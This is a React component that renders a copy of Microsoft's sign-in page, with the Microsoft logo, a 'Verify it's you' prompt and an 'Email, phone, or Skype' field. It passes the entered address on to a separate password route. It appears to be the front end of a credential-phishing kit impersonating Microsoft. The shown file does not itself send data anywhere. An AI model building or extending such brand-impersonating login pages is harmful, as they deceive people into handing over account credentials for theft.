import React, { useEffect, useState } from 'react';
import { Link } from 'react-router-dom';
import axios from 'axios'
import { useNavigate } from 'react-router-dom';
import Microsoftlogo from './assets/microsoftlogo.png';
import Questionmark from './assets/question4.png';
import Menudots from './assets/footerdots.png';
import './App.css';

function Signup() {
    const [email, setEmail] = useState('');
    const [animate, setAnimate] = useState(false);
    const navigate = useNavigate();

    useEffect(() => {
        setAnimate(true);
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        navigate('/password', { state: { email } });
    }

  return (
        <div className='background-image'>
            <div className='container'>
                <div className={`form-container ${animate ? 'animate' : ''}`}>
                    <div className='header-logo'>
                            <img src={Microsoftlogo} alt="Microsoft logo" style={{ width: '150px' }} />
                    </div>
                        <form onSubmit={handleSubmit}>
                            <div>
                                <label htmlFor='email'>
                                    <p className='p1'>Verify it's you</p>
                                </label> <br></br>
                                <input  
                                    type='text'
                                    placeholder='Email, phone, or Skype'
                                    autoComplete='off'
                                    name='email'
                                    className='textbox'
                                    required
                                    onChange={(e) => setEmail(e.target.value)}
                                />
                                <hr className='hr1'></hr>
                                <label className='label1' htmlFor=''>No account?</label>
                                <a className='a1' href='#'>Create one!</a><br></br>
                                <a className='a2' href='#'>Sign in with a security key</a>
                                <a className='a3' href='#'><img className='img2' src={Questionmark} alt=''></img></a>
                            </div>
                            <button type='submit' className='next btn btn-primary w-25 rounded-0'>
                            Next
                        </button>
                        </form>                            
                </div>
            </div>
            <div className='footer'>
                <a className='a4' href='#'>Terms of use</a>
                <a className='a5' href='#'>Privacy & cookies</a>
                <a className='a6' href='#'><img className='img6' src={Menudots} alt=''></img></a>
            </div>
        </div>
        

        
  )
}

export default Signup;